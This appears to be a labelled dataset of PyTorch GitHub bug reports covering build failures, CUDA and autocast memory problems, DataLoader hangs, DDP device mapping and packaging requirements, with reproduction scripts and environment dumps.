"If test suite triggers CUDA assert, should stop running tests module: cuda module: tests triaged","Every test after the CUDA assert will fail, but only the first test will be relevant. It would be more user friendly to immediately halt the test suite the first time a CUDA assert fails.

cc @ngimel @mruberry @VitalyFedyunin @walterddr",True
Checking the hw.optional.arm64 sysctl prevents Apple Silicon from building a universal binary module: build triaged,"This check https://github.com/pytorch/pytorch/blob/e7ca62be08f96b07efc1271baf9b02d4e7be226a/cmake/Modules/FindARM.cmake#L44-L45 prevents an Apple Silicon Mac from building an x86_64 variant of Pytorch.

I'm sure the check exists because folks are installing CMake as an x86_64 binary from homebrew, so they want to use it to pick a different architecture from the CMake architecture, however this is how I got here:

I built and installed both CMake and ninja as Universal 2 binaries.
I built Python 3.9.1rc1 as x86_64 using `arch -x86_64`  before the Python configure/make commands.

When I run this x86_64 Python, it runs the x86_64 CMake binary, which is actually correct in this case (unlike the case where you only have an x86_64 CMake binary, so arm64 processes drop to x86_64 and you need the sysctl).

With `CMAKE_SYSTEM_PROCESSOR=x86_64 CMAKE_OSX_ARCHITECTURES=x86_64 python3.9 setup.py build` and a small fix to CMake itself (upstream issue here https://gitlab.kitware.com/cmake/cmake/-/issues/21554), I am able to convince Pytorch to build as x86_64 on this machine.

However, it breaks partway through the build due to the NEON definitions that are enabled by the issue I'm describing here.

If I remove the sysctl check in FindARM, an x86_64 build completes successfully on an M1, which I was able to manually `lipo` to make a fully universal2 pytorch package.

cc @malfet @seemethere @walterddr",True
torch.multinomial selects elements with zero weight high priority triage review module: binaries module: distributions triaged module: random,"## üêõ Bug

torch.multinomial sometimes selects elements with zero weight.

## To Reproduce

When I run this code, element 0 is often selected within 200 iterations on CPU and within 1000 iterations on CUDA:

```
for i in range(10000):
    print(i)
    probabilities = torch.zeros(100000, 2)
    probabilities[:, 1] = 1.0
    result = torch.multinomial(probabilities, num_samples=1)[:, 0]
    assert (result == 1).all()
```

## Expected behavior

An element with weight 0 is never selected.

## Environment

PyTorch version: 1.7.0+cu101
Is debug build: True
CUDA used to build PyTorch: 10.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: version 3.18.2

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: Quadro GV100
Nvidia driver version: Could not collect
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.0.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.0.1
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.4
[pip3] torch==1.7.0+cu101
[conda] blas                      1.0                         mkl
[conda] mkl                       2020.2                      256
[conda] mkl-include               2020.2                      256
[conda] mkl-service               2.3.0            py38he904b0f_0
[conda] mkl_fft                   1.2.0            py38h23d657b_0
[conda] mkl_random                1.1.1            py38h0573a6f_0
[conda] numpy                     1.19.1           py38hbc911f0_0
[conda] numpy-base                1.19.1           py38hfa32c7d_0
[conda] torch                     1.8.0a0                  pypi_0    pypi

## Additional context
See also https://github.com/pytorch/pytorch/issues/4858 and https://github.com/pytorch/pytorch/issues/13867

Many thanks for all your work on PyTorch! I find it very useful.



cc @ezyang @gchanan @zou3519 @seemethere @malfet @fritzo @neerajprad @alicanb @nikitaved @pbelevich @bdhirsh @jbschlosser @walterddr",True
"error: a member of type ""const c10::Symbol"" cannot have an in-class initializer on Windows module: build module: windows triaged","## üêõ Bug

PR #48717 replaced `constexpr` with `CONSTEXPR_EXCEPT_WIN_CUDA` to resolve some of the problems on CUDA+Windows for TorchVision as discussed at pytorch/vision#3051. Unfortunately we continue having issues:
```
C:/Users/circleci/project/env/lib/site-packages/torch/include\torch/csrc/jit/ir/ir.h(1329): error: a member of type ""const c10::Symbol"" cannot have an in-class initializer

C:/Users/circleci/project/env/lib/site-packages/torch/include\torch/csrc/jit/ir/ir.h(1349): error: a member of type ""const c10::Symbol"" cannot have an in-class initializer
```

I believe we need to move the initialization outside of the class on the following two places:
https://github.com/pytorch/pytorch/blob/0484b048d050ea5b10cb0efd147148aa893f2a4b/torch/csrc/jit/ir/ir.h#L1329
https://github.com/pytorch/pytorch/blob/0484b048d050ea5b10cb0efd147148aa893f2a4b/torch/csrc/jit/ir/ir.h#L1349

cc @malfet @seemethere @walterddr @peterjc123 @maxluk @nbcsm @guyang3532 @gunandrose4u @mszhanyi @skyline75489 @ezyang
",True
[dataloader] hang on python exit when has iter ref and sampler yields large indices module: dataloader triaged,"## üêõ Bug

Using the DataLoader causes the main process to hang on exit waiting to join the indices queue putting thread when the sampler is large (e.g., when `batch_size` is large) and a reference to the iterator is kept around (e.g., when `persistent_workers=True`). For instance, see the following simple script:

```py
import torch

class Dataset(torch.utils.data.Dataset):
    def __len__(self):
        return 10000000

    def __getitem__(self, any):
        return torch.empty(0)

if __name__ == '__main__':
    dl = torch.utils.data.DataLoader(
        Dataset(),
        batch_size=40960,
        num_workers=1)

    it = iter(dl)

    for i, x in enumerate(it):
        print(x.shape)
        raise RuntimeError()
```

Running the above in the below environment (pretty standard) will hang at exiting. Some probing suggests that this is due to the main process try to join the `_index_queues`. And, **due to** the iterator being around, the ordering of python atexit calls decides to call the `multiprocessing.Queue` clean-up (which joins the queue putting thread) before cleaning up `_MultiprocessingDataLoaderIter.__del__` (which would clean-up nicely). 

Finally, since the above uses a sampler with *large* indices sent to workers at each time (constructed by the dataloader using a `RandomSampler` wrapped in a `BatchSampler`), the putting thread is hanging waiting for more room in the pipe. The stderr will hang at 
```py
torch.Size([40960, 0])
Traceback (most recent call last):
  File ""XXXX/test.py"", line 34, in <module>
    raise RuntimeError()
RuntimeError
```

NB: the worker yields empty tensors, and thus its putter thread shouldn't be the reason of hanging.


To confirm that this also happens with a simpler sampler, the following script with disabled auto-batching hangs similarly:
```py
import torch


class BigSampler(object):
    def __iter__(self):
        for idx in range(20):
            yield [idx for idx in range(40960)]


class Dataset(torch.utils.data.Dataset):

    def __init__(self):
        self.first_time = True

    def __len__(self):
        return 10000000

    def __getitem__(self, indices):
        # NB: this is called *once* per dataloader fetch since we disabled auto-batching!
        if not self.first_time:
            # simulate some work so that the index_queue is likely non-empty 
            # (and thus the main process's queue putting is waiting). 
            import time
            time.sleep(0.1)
        self.first_time = False
        return torch.empty(0)


if __name__ == '__main__':
    dl = torch.utils.data.DataLoader(
        Dataset(),
        batch_size=None,
        sampler=BigSampler(),
        num_workers=1)

    it = iter(dl)

    for i, x in enumerate(it):
        print(x.shape)
        raise RuntimeError()
```

## Environment
```
PyTorch version: 1.7.0
Is debug build: True
CUDA used to build PyTorch: 10.1
ROCM used to build PyTorch: N/A

OS: Ubuntu 16.04.7 LTS (x86_64)
GCC version: Could not collect
Clang version: Could not collect
CMake version: version 3.14.0

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.243
GPU models and configuration:
GPU 0: TITAN V
GPU 1: TITAN V
GPU 2: TITAN V
GPU 3: TITAN V

Nvidia driver version: 455.23.05
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip] numpy==1.17.2
[pip] torch==1.7.0
[pip] torchaudio==0.7.0a0+ac17b64
[pip] torchfile==0.1.0
[pip] torchvision==0.8.1
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               10.1.243             h6bb024c_0
[conda] mkl                       2019.4                      243
[conda] mkl-include               2019.4                      243
[conda] mkl-service               2.3.0            py37he904b0f_0
[conda] mkl_fft                   1.2.0            py37h23d657b_0
[conda] mkl_random                1.1.0            py37hd6b4f25_0
[conda] numpy                     1.16.0                   pypi_0    pypi
[conda] numpy-base                1.17.2           py37hde5b4d6_0
[conda] pytorch                   1.7.0           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] torch                     1.3.0                    pypi_0    pypi
[conda] torchaudio                0.7.0                      py37    pytorch
[conda] torchfile                 0.1.0                    pypi_0    pypi
[conda] torchvision               0.6.0a0+35d732a          pypi_0    pypi
```


cc @SsnL @VitalyFedyunin @ejguan",True
Bad error message when int overflows module: docs module: internals triaged,"```
>>> import torch
>>> torch.empty(2 * 10 ** 20)
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
TypeError: empty(): argument 'size' must be tuple of ints, but found element of type int at pos 1
```

I'd expect it to tell me overflow has happened.

BTW, Python still thinks this is an int:

```
>>> print(2 * 10 ** 20)
200000000000000000000
```

cc @jlin27 @mruberry @ezyang @bhosmer @smessmer @ljk53 @bdhirsh @ailzhang",True
native amp consumes 10x gpu memory  high priority triaged module: amp (automated mixed precision),"## üêõ Bug

observation: pytorch native amp consumes 10x memory as compared to fp16/apex or no `--fp16` usage.

The issue has been originally discovered and tracked at https://github.com/huggingface/transformers/issues/8403 and on slack, but now we know for sure that this is a pytorch issue, so let's concentrate the discussion here.

## To Reproduce

What's following is the minimal script that was reduced from a rather complex logic of `finetune.py` in `transformers`. It originates in a complex stack of `pytorch-lightning` feeding `transformers` generate/beam_search logic finally feeding to real pytorch logic in `BartForConditionalGeneration`. If you want to see the full blow up and how to set it up, it's described [here](https://github.com/huggingface/transformers/issues/8403).

I found at least part of the culprit or trigger of the leak - it's `@torch.no_grad()` used for `generate` https://github.com/huggingface/transformers/blob/eb3bd73ce35bfef56eeb722d697f2d39a06a8f8d/src/transformers/generation_utils.py#L281-L282

Here is a short script that reproduces the leakage. It removes all the generate/search logic and feeds the same random `input_ids` to `BartForConditionalGeneration` pre-trained model.

Please first run:
```
pip install ipyexperiments 
```
to get the memory tracing, but feel free to disable it if for some reason it's not working for you and use some alternative like `nvidia-smi` dumping. (but it should work)

```python
#!/usr/bin/env python

import os
import sys
import torch
os.environ[""USE_TF""] = ""0""
sys.path.insert(1, ""src"")

# !pip install ipyexperiments 
from ipyexperiments.utils.mem import gpu_mem_get_used_mbs, gpu_mem_get_used_no_cache_mbs

from transformers import BartForConditionalGeneration

device = torch.device('cuda:0' if torch.cuda.is_available() else 'cpu')

model = BartForConditionalGeneration.from_pretrained('sshleifer/student_cnn_12_6').to(device)
model.eval()

vocab_size = 50264 # model.config.vocab_size
length = 10

AUTOCAST = False if ""-f"" in sys.argv else True
print(f""autocast: {AUTOCAST}"")

class MemReport():
    def __init__(self, gc_collect=True):
        self.get_mem = gpu_mem_get_used_no_cache_mbs if gc_collect else gpu_mem_get_used_mbs
        self.cur = self.get_mem()
    def delta(self, id):
        peak = torch.cuda.memory_stats()[""allocated_bytes.all.peak""]
        print(f""{id}: {gpu_mem_get_used_mbs()-self.cur}MB (peak {peak>>20}MB)"")
        self.cur = self.get_mem()
        
mr = MemReport(gc_collect=False)

### reproducible code starts here ###

@torch.no_grad()
def logic():
    input_ids = torch.randint(vocab_size, (1,length)).to(device)
    mr.delta(0)
    for i in range(1,10):
        outputs = model(input_ids)
        mr.delta(i)

if AUTOCAST:
    with torch.cuda.amp.autocast():
        logic()
else:
    logic()
```

So if I run it with `-f` which disables `autocast`, I get:

```
./reproduce.py -f
autocast: False
0: 0MB (peak 1165MB)
1: 12MB (peak 1167MB)
2: 0MB (peak 1169MB)
3: 0MB (peak 1169MB)
4: 0MB (peak 1169MB)
5: 0MB (peak 1169MB)
6: 0MB (peak 1169MB)
7: 0MB (peak 1169MB)
8: 0MB (peak 1169MB)
9: 0MB (peak 1169MB)
```
no leak.

If however I remove `-f` and `autocast` gets enabled, we get:
```
./reproduce.py
autocast: True
0: 0MB (peak 1165MB)
1: 592MB (peak 1744MB)
2: 580MB (peak 2324MB)
3: 580MB (peak 2902MB)
4: 580MB (peak 3480MB)
5: 580MB (peak 4058MB)
6: 580MB (peak 4636MB)
7: 580MB (peak 5214MB)
8: 580MB (peak 5793MB)
9: 580MB (peak 6371MB)
```
the memory logger prints the delta for each `forward` call in the loop and the peak memory.

You can see that we are leaking 600Mb per forward call here.

If I comment out `@torch.no_grad()`, the total memory usage doubles but there is no leak:

```
autocast: True
0: 0MB (peak 1165MB)
1: 602MB (peak 1754MB)
2: 590MB (peak 2343MB)
3: 0MB (peak 2343MB)
4: 0MB (peak 2343MB)
5: 0MB (peak 2343MB)
6: 0MB (peak 2343MB)
7: 0MB (peak 2343MB)
8: 0MB (peak 2343MB)
9: 0MB (peak 2343MB)
```

I was using pycharm to debug this and to write a small script and boy it got me so delayed as it leaks gpu ram on its own, since it has to save all those variables on cuda, but I wasn't aware of it. Well, now I know not to do that. Luckily I had https://github.com/stas00/ipyexperiments handy to give me easy memory tracing.

Note I'm importing two gpu mem tracking functions - one of them clears cuda cache - but here it appears it's better not use that version. 

## Expected behavior

Shouldn't consume 10x gpu memory (apex does not).

## Environment

```
Collecting environment information...
PyTorch version: 1.8.0.dev20201115+cu110
Is debug build: False
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: Could not collect
CMake version: version 3.16.3

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration:
GPU 0: GeForce RTX 3090
GPU 1: GeForce GTX 1070 Ti

Nvidia driver version: 455.32.00
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.0.4
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.0.4
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.4
[pip3] pytorch-lightning==1.0.4
[pip3] pytorch-memlab==0.2.2
[pip3] torch==1.8.0.dev20201115+cu110
[pip3] torchtext==0.6.0
[pip3] torchvision==0.9.0.dev20201115+cu110
[conda] numpy                     1.19.4                   pypi_0    pypi
[conda] pytorch-lightning         1.0.4                     dev_0    <develop>
[conda] pytorch-memlab            0.2.2                    pypi_0    pypi
[conda] torch                     1.8.0.dev20201115+cu110          pypi_0    pypi
[conda] torchtext                 0.6.0                    pypi_0    pypi
[conda] torchvision               0.9.0.dev20201115+cu110          pypi_0    pypi
```

@mcarilli, @ptrblck 

cc @ezyang @gchanan @zou3519 @bdhirsh @mcarilli",True
INTERNAL ASSERT FAILED for `S.unique().shape` high priority module: autograd triaged module: regression,"## üêõ Bug

<!-- A clear and concise description of what the bug is. -->

## To Reproduce
The stacktrace is
```
  File ""/home/ezheltonozhskii/dense_c3dpo/model.py"", line 122, in get_optimal_view
    if S.unique().shape != S.shape: 
  File ""/opt/conda/lib/python3.7/site-packages/torch/tensor.py"", line 519, in unique
    return torch.unique(self, sorted=sorted, return_inverse=return_inverse, return_counts=return_counts, dim=dim)
  File ""/opt/conda/lib/python3.7/site-packages/torch/_jit_internal.py"", line 267, in fn
    return if_false(*args, **kwargs)
  File ""/opt/conda/lib/python3.7/site-packages/torch/_jit_internal.py"", line 267, in fn
    return if_false(*args, **kwargs)
  File ""/opt/conda/lib/python3.7/site-packages/torch/functional.py"", line 768, in _return_output
    output, _, _ = _unique_impl(input, sorted, return_inverse, return_counts, dim)
  File ""/opt/conda/lib/python3.7/site-packages/torch/functional.py"", line 683, in _unique_impl
    return_counts=return_counts,
RuntimeError: isDifferentiableType(variable.scalar_type()) INTERNAL ASSERT FAILED at ""/pytorch/torch/csrc/autograd/functions/utils.h"":64, please report a bug to PyTorch.
```
I can't share exact code but I have different behaviour depending on whether all elements of tensor are unique in spirit of
```py
if S.unique().shape != S.shape: 
  return x
return y
```

## Expected behavior

The code works or raises exception.

## Environment

You can get the script and run it with:
```
PyTorch version: 1.8.0.dev20201024+cu110
Is debug build: True
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Debian GNU/Linux 9.13 (stretch) (x86_64)
GCC version: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
Clang version: Could not collect
CMake version: Could not collect

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: GPU 0: A100-SXM4-40GB
Nvidia driver version: 450.51.06
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] efficientnet-pytorch==0.6.3
[pip3] numpy==1.18.5
[pip3] numpydoc==1.1.0
[pip3] pytorch3d==0.2.5
[pip3] segmentation-models-pytorch==0.1.2
[pip3] torch==1.8.0.dev20201024+cu110
[pip3] torchvision==0.8.0.dev20201024+cu110
[conda] efficientnet-pytorch      0.6.3                    pypi_0    pypi
[conda] mkl                       2019.5                      281    conda-forge
[conda] mkl-service               2.3.0            py37h516909a_0    conda-forge
[conda] mkl_fft                   1.1.0            py37hc1659b7_1    conda-forge
[conda] mkl_random                1.1.0            py37hb3f55d8_0    conda-forge
[conda] numpy                     1.16.5           py37h95a1406_0    conda-forge
[conda] numpy-base                1.18.5           py37h2f8d375_0  
[conda] numpydoc                  1.1.0              pyh9f0ad1d_0    conda-forge
[conda] pytorch3d                 0.2.5                    pypi_0    pypi
[conda] segmentation-models-pytorch 0.1.2                    pypi_0    pypi
[conda] torch                     1.8.0.dev20201024+cu110          pypi_0    pypi
[conda] torchvision               0.8.0.dev20201024+cu110          pypi_0    pypi
```



cc @ezyang @gchanan @zou3519 @bdhirsh @albanD @gqchen @pearu @nikitaved",True
DDP mismatch in rank to GPU selection oncall: distributed triaged module: ddp,"## üêõ Bug

Possible root cause for https://github.com/pytorch/pytorch/pull/45435.  CC @walterddr 
Thanks to @jaglinux for the following triage information.

For barrier call, all reduce uses tensor of device type cuda with the following formula:

`int16_t deviceIdx = static_cast<int16_t>(rank_ % numGPUs);`

https://github.com/pytorch/pytorch/blob/a49367e9c9fcfa9547782420a24441f13fef19dc/torch/lib/c10d/ProcessGroupNCCL.cpp#L1413

But when the tests are called, the tensors uses different formula to calculate rank to GPU selection.

https://github.com/pytorch/pytorch/blob/a49367e9c9fcfa9547782420a24441f13fef19dc/torch/testing/_internal/distributed/distributed_test.py#L367-L374

Hence for rank 0,1,2 ; barrier uses tensors of cuda0, cuda1, cuda2 device type and for testing, tensors of cuda0, cuda2, cuda4 are used.

If we change `rank_to_GPU` data structure in distributed_test.py to return `rank % numGPUs`. With this change, all the tests are passing.

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski @SciPioneer @H-Huang @mrzzd",True
torch.testing.assert_allclose doesn't check shapes module: tests triaged module: testing,"## üêõ Bug
Tensors of different shapes can be considered `allclose`:
```python
import torch

# Two tensors of different shapes
A = torch.zeros((1, 1))
B = torch.zeros((1,))

torch.testing.assert_allclose(A, B) # passes
```

## Expected behavior

The numpy equivalent - which `assert_allclose` [was based on](https://github.com/pytorch/pytorch/pull/6200) - fails, as it should:
```python
import numpy as np

A = np.zeros((1, 1))
B = np.zeros((1,))

np.testing.assert_allclose(A, B) # fails
```

## Environment
```
Collecting environment information...
PyTorch version: 1.5.1
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.4 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.18.2

Python version: 3.7 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.2.89
GPU models and configuration: 
GPU 0: GeForce RTX 2080 Ti
GPU 1: GeForce RTX 2080 Ti

Nvidia driver version: 440.100
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip] numpy==1.18.5
[pip] pytorch-memlab==0.0.4
[pip] torch==1.5.1
[pip] torchvision==0.6.1
[conda] numpy                     1.18.5                   pypi_0    pypi
[conda] pytorch-memlab            0.0.4                    pypi_0    pypi
[conda] torch                     1.5.1                    pypi_0    pypi
[conda] torchvision               0.6.1                    pypi_0    pypi
```

## Additional context
The culprit is these two lines
```python
    if expected.shape != actual.shape:
        expected = expected.expand_as(actual)
```
in `assert_allclose`. This means it's obviously deliberate that shape's ignored, but the divergence from numpy is surprising. What's even more surprising is that it makes `assert_allclose` noncommutative:
```python
A = torch.zeros((1, 1))
B = torch.zeros((1,))

torch.testing.assert_allclose(A, B) # passes
torch.testing.assert_allclose(B, A) # fails
```
All in all I'm expecting a 'working as intended, #wontfix' here, which is fair enough. But I figured I'd open this issue to catch anyone else who's tripped up by this and goes a-Googling. 

cc @mruberry @VitalyFedyunin",True
CUDA 11.0 compilation flags incorrect for extensions module: build module: cuda triaged,"## üêõ Bug

CUDA11.0 does not support sm_86.

PyTorch by default uses the capability of device to compile extensions:
https://github.com/pytorch/pytorch/blob/996f444c007a89f7364ed03b7c24755f7ec43eb0/torch/utils/cpp_extension.py#L1424-L1427

Therefore, if a user uses CUDA11.0 pytorch binary on RTX30- GPUs, extension will be compiled with sm_86 and cause compilation error.


## Expected behavior

Extension be compiled with a capability of 8.0 instead.


cc @malfet @seemethere @walterddr @ngimel",True
XNNPACK/src/qu8-requantization/precise-psimd.c:139:1: error: unrecognizable insn: high priority triage review module: build triaged has workaround module: xnnpack,"## üêõ Bug

on commit 5c8896f8ad80b7e8a463bbc3428c0635fccbf01a

build with:
`
USE_CUDA=0 DEBUG=1 BUILD_CAFFE2_OPS=0 python setup.py install
`

result:
```
../third_party/pthreadpool/include/pthreadpool.h:997:2: warning: ‚Äòpthreadpool_function_1d_t‚Äô is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_1d_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1003:2: warning: ‚Äòpthreadpool_function_1d_tiled_t‚Äô is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_1d_tiled_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1010:2: warning: ‚Äòpthreadpool_function_2d_t‚Äô is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_2d_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1017:2: warning: ‚Äòpthreadpool_function_2d_tiled_t‚Äô is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_2d_tiled_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1026:2: warning: ‚Äòpthreadpool_function_3d_tiled_t‚Äô is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_3d_tiled_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/pthreadpool/include/pthreadpool.h:1037:2: warning: ‚Äòpthreadpool_function_4d_tiled_t‚Äô is deprecated [-Wdeprecated-declarations]
  pthreadpool_function_4d_tiled_t function,
  ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
../third_party/XNNPACK/src/qs8-requantization/precise-psimd.c: In function ‚Äòxnn_qs8_requantize_precise__psimd‚Äô:
../third_party/XNNPACK/src/qs8-requantization/precise-psimd.c:139:1: error: unrecognizable insn:
 }
 ^
```

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0):
 - OS (e.g., Linux):
 - How you installed PyTorch (`conda`, `pip`, source):
 - Build command you used (if compiling from source):
 - Python version:
 - CUDA/cuDNN version:
 - GPU models and configuration:
 - Any other relevant information:

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @bdhirsh @malfet @seemethere @walterddr",True
PyTorch 1.7.0 CUDA driver warning module: cuda triaged,"## üêõ Bug

The following warning appears only on `torch==1.7.0`

```
../../../virtualenv/python3.8.3/lib/python3.8/site-packages/torch/cuda/__init__.py:52

  /home/travis/virtualenv/python3.8.3/lib/python3.8/site-packages/torch/cuda/__init__.py:52: UserWarning: CUDA initialization: Found no NVIDIA driver on your system. Please check that you have an NVIDIA GPU and installed a driver from http://www.nvidia.com/Download/index.aspx (Triggered internally at  /pytorch/c10/cuda/CUDAFunctions.cpp:100.)

    return torch._C._cuda_getDeviceCount() > 0
```

Looking at the [pull request](https://github.com/pytorch/pytorch/pull/42249) that introduced it, no warning should be raised for ""call to device_count()"" with ""no gpus""

Having to filter this warning every time `device_count` is called is not ideal.

## To Reproduce

`torch.cuda.device_count()`

## Expected behavior

Does not raise a warning.


cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @ngimel",True
"RuntimeError: ""mul_cuda"" not implemented for 'Bool' high priority triage review triaged module: regression module: boolean tensor","## üêõ Bug

I just upgraded to PyTorch 1.7 and I now get an this error when multiplying a Python bool with a cuda bool tensor. I do not get the error on CPU. Furthermore, it was working well on the previous version (1.6).

## To Reproduce

![image](https://user-images.githubusercontent.com/1090012/97480979-88d65200-192a-11eb-8414-4afe5eb7be71.png)

## Environment

Collecting environment information...
PyTorch version: 1.7.0+cu110
Is debug build: True
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.1 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
Clang version: Could not collect
CMake version: Could not collect

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: Could not collect
GPU models and configuration: 
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce GTX 1080 Ti
GPU 2: GeForce GT 1030

Nvidia driver version: 450.51.06
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.18.5
[pip3] torch==1.7.0+cu110
[pip3] torchaudio==0.7.0
[pip3] torchvision==0.8.1+cu110
[conda] Could not collect



cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @izdeby",True
Constructing a ParameterDict raises a warning high priority module: nn triaged,"## üêõ Bug

Constructing a `ParameterDict` raises a `UserWarning`.

## To Reproduce

Install PyTorch 1.7
```py
>>> import torch.nn as nn
>>> nn.ParameterDict()
/Users/fobermey/opt/miniconda3/envs/pyro/lib/python3.7/site-packages/torch/nn/modules/container.py:550: UserWarning: Setting attributes on ParameterDict is not supported.
  warnings.warn(""Setting attributes on ParameterDict is not supported."")
ParameterDict()
```

## Expected behavior

PyTorch should not raise warnings in normal usage. Tests should verify this.

## Environment

```
PyTorch version: 1.7.0
Is debug build: True
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: Mac OSX 10.15.7 (x86_64)
GCC version: Could not collect
Clang version: 12.0.0 (clang-1200.0.32.2)
CMake version: version 3.18.2

Python version: 3.7 (64-bit runtime)
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] numpyro==0.3.0
[pip3] torch==1.7.0
[pip3] torchfile==0.1.0
[pip3] torchvision==0.8.1
[conda] numpy                     1.19.0                   pypi_0    pypi
[conda] numpyro                   0.3.0                    pypi_0    pypi
[conda] torch                     1.7.0                    pypi_0    pypi
[conda] torchfile                 0.1.0                    pypi_0    pypi
[conda] torchvision               0.8.1                    pypi_0    pypi
```

cc @ezyang @gchanan @zou3519 @bdhirsh @heitorschueroff @albanD @mruberry",True
"v1.7 requirement ""dataclasses"" is not compatible with python > 3.6 module: build oncall: releng triaged","## üêõ Bug

v1.7 for Python 3.7 and 3.8 has requirement for `dataclasses` but it is not compatible with 3.7 and 3.8.
```
ERROR: Package 'dataclasses' requires a different Python: 3.7.7 not in '>=3.6, <3.7'
```
This result in not install torch.

Note :  `dataclasses` is part of Python 3.7 : https://docs.python.org/3.7/library/dataclasses.html

## To Reproduce
Install pytorch in a virtual env. freshly created. With python 3.7
```
(env) $ pip install ./torch-1.7.0-cp37-cp37m-linux_x86_64.whl
```

## Expected behavior

Install correctly without package dependency failing.

## Environment

 - PyTorch Version (e.g., 1.0): v1.7
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Build command you used (if compiling from source):
 - Python version: 3.7 and 3.8
 - CUDA/cuDNN version: 11
 - GPU models and configuration: - 
 - Any other relevant information: -


Please add a marker to requirement for python 3.6 only.
https://github.com/pytorch/pytorch/blob/bbe5bfaa4f5ec1d80cd971198e4abcfd2ea96a7a/requirements.txt#L8
should be:
```
dataclasses; python_version<""3.7""
```

cc @malfet @seemethere @walterddr",True
